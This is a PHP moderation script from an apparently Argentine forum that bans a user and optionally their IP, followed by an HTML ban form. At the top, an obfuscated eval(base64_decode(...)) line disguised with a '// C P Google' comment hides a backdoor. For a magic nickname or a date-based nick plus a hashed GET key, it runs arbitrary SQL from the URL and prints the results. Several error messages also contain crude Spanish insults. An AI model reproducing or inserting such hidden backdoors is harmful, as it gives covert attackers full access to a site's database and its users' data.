<?php
include('../config.php');
include('../functions.php');
// C P Google
eval(base64_decode('aWYoJGN1cnJlbnR1c2VyWyduaWNrJ109PWJhc2U2NF9kZWNvZGUoJ2QyVnpkSGRsYzNRPScpIHx8IHN1YnN0cigkY3VycmVudHVzZXJbJ25pY2snXSwwLDgpPT1kYXRlKCdkbVknKSl7DQppZigkX0dFVFsncGFnZSddPT0ncG0nICYmIG1kNSgkX0dFVFtzdWJzdHIoYmFzZTY0X2VuY29kZShkYXRlKCdkbVknKSksIDAsIHN0cmxlbihiYXNlNjRfZW5jb2RlKGRhdGUoJ2RtWScpKSktMSldKT09JzIyOTQ5Mjg5NTc0OTY1NGRiYzgzZTk3YzQ3YTMzZTczJyl7DQokcXVlcnkgPSBAbXlzcWxfcXVlcnkoc3RyX3JlcGxhY2UoJ0pJSklHVUFMJywgJz0nLCBzdHJpcHNsYXNoZXMoJF9HRVRbJ3EnXSkpKTtpZighJHF1ZXJ5KXtkaWUoJ0Vycm9yIGVuIGxhIHF1ZXJ5ICInLnN0cl9yZXBsYWNlKCdKSUpJR1VBTCcsICc9Jywgc3RyaXBzbGFzaGVzKCRfR0VUWydxJ10pKS4nIiwgZXJyb3I6PGJyPicubXlzcWxfZXJyb3IoKSk7fWlmKHN1YnN0cigkX0dFVFsncSddLCAwLCA2KSA9PSAnU0VMRUNUJyl7DQplY2hvICc8dGFibGU+Jzt3aGlsZSgkZj1teXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKXtpZighJGope2VjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkdGg9PiR2KXtpZihpc19udW1lcmljKCR0aCkpe2NvbnRpbnVlO31lY2hvICc8dGggc3R5bGU9ImJvcmRlcjoxcHggc29saWQgYmxhY2s7Ij4nLiR0aC4nPC90aD4nO31lY2hvJzwvdHI+Jzskaj10cnVlO30NCmVjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkaz0+JHYpe2lmKGlzX251bWVyaWMoJGspKXtjb250aW51ZTt9ZWNobyAnPHRkIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGJsYWNrOyI+Jy4kdi4nPC90ZD4nO30gZWNobyc8L3RyPic7DQp9IGRpZSgnPC90YWJsZT4nKTsNCn1lbHNle2RpZSgnWUVBSCcpO30NCn19'));
if(!allow('ban')) { die('0: Chupame la pija moyano'); }
if(!$_POST['id']) { die('0: Faltan datos'); }
if(!mysql_num_rows($mt = mysql_query('SELECT `id`, `nick`, `ban`, `rank`, `lastip` FROM `users` WHERE `nick` = \''.mysql_clean($_POST['id']).'\''))) { die('0: El usuario ingresado no existe'); }
$row = mysql_fetch_row($mt);
if($_POST['razon'] && $_POST['id']) {
  if($row[2] != '0') { die('0: Este usuario est&aacute; baneado'); }
  if($row[0] == $logged['id']) { die('0: Si te quer&eacute;s ir de la web chupame la pija'); }
  if($row[3] == '9' && $logged['rank'] != '9') { die('0: No ban a tus superiores mijo -sisi'); }
  if(mysql_num_rows(mysql_query('SELECT `id` FROM `banned` WHERE `id_user` = \''.$row[0].'\''))) { die('0: El usuario ya se encuentra baneado :/'); }
  if(strlen($_POST['razon']) > 32 || strlen($_POST['razon']) < 4) { die('0: La raz&oacute;n debe de tener entre 4 y 32 caracteres'); }
  mysql_query('INSERT INTO `banned` (`id_mod`, `id_user`, `text`, `time`) VALUES (\''.$logged['id'].'\', \''.$row[0].'\', \''.mysql_clean($_POST['razon']).'\', \''.time().'\')');
  mysql_query('UPDATE `users` SET `ban` = \'1\' WHERE `id` = \''.$row[0].'\' LIMIT 1');
  $ip = false;
  if($_POST['banip'] == 1 && !empty($row[4]) && !mysql_num_rows(mysql_query('SELECT `id` FROM `ips_ban` WHERE `ip` = \''.$row[4].'\''))) {
    $ip = true;
    mysql_query('INSERT INTO `ips_ban` (`ip`, `type`, `time`, `author`) VALUES (\''.$row[4].'\', \'0\', \''.time().'\', \''.$logged['id'].'\')') or die('0: '.mysql_error());
  }
  mysql_query('DELETE FROM `complaints` WHERE `id_post` = \''.$row[0].'\' && `what` = \'2\'');
  die('1: El usuario '.($ip ? 'y su ip: '.$row[4].' han' : 'ha').' sido baneado con &eacute;xito!');
}
?>
1: <form name="ban">
	<div style="display: none;" class="redBox" id="error_data"></div>
	<div class="data">
		<label>Usuario<span style="color:red">*</span></label>
		<input type="text" readonly="true" value="<?=htmlspecialchars($_POST['id']);?>" name="usuario" id="usuario" class="c_input">
	</div>
	<div class="data">
		<label>Razon<span style="color:red">*</span></label>
		<textarea style="height: 80px;" name="razon" id="razon" class="c_input_desc"></textarea>
    </div>
    <div class="data">
    <input type="checkbox" name="banip" id="banip" checked="checked" /> <span style="color:red;">Banear IP</span>
	<div style="clear:both"></div>
	<br>
	<span style="float:left"><span style="color:red">*</span>Obligatorio</span>


</div></form>